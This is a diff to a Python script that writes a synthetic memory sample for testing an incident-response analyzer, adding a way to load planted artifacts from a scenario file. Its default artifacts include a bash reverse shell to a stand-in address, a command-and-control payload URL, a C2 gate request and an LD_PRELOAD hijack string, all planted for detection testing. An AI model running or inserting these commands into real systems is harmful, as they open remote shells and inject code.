@@ -20,16 +20,36 @@ def _fill(base, size):
     return (base * (size // len(base) + 1))[:size]
 
 
+def scenario_artifacts():
+    """Corpus override: the scenario decides what the analyzer should find.
+
+    An EMPTY list is meaningful — a clean host's sample carries no planted artifact at
+    all, which is what proves the analyzer's absence path rather than only its hits."""
+    path = os.environ.get("IR_SAMPLE_ARTIFACTS_FILE")
+    if not path:
+        return None
+    import json
+    try:
+        with open(path) as fh:
+            items = json.load(fh).get("memory_artifacts", [])
+        return b"".join(s.encode() + b"\x00" for s in items)
+    except (OSError, ValueError) as exc:
+        print(f"[make_sample] WARN: artifacts file unreadable ({exc}); using defaults")
+        return None
+
+
 def main(path):
     # Low-entropy filler (ordinary process memory-ish).
     filler = b"the quick brown fox jumps over the lazy dog 0123456789 " * 32
-    # Planted artifacts the analyzer should surface.
-    artifacts = b"".join([
-        b"\x00GET /gate.php HTTP/1.1\r\nHost: 203.0.113.66\r\n\x00",
-        b"http://malicious-c2.example.net/payload/stage2.bin\x00",
-        b"bash -i >& /dev/tcp/198.51.100.23/4444 0>&1\x00",
-        b"LD_PRELOAD=/tmp/.x/evil.so\x00",
-    ])
+    # Planted artifacts the analyzer should surface — the scenario's when one is given.
+    artifacts = scenario_artifacts()
+    if artifacts is None:
+        artifacts = b"".join([
+            b"\x00GET /gate.php HTTP/1.1\r\nHost: 203.0.113.66\r\n\x00",
+            b"http://malicious-c2.example.net/payload/stage2.bin\x00",
+            b"bash -i >& /dev/tcp/198.51.100.23/4444 0>&1\x00",
+            b"LD_PRELOAD=/tmp/.x/evil.so\x00",
+        ])
     written = 0
     block = 0
     with open(path, "wb") as fh:
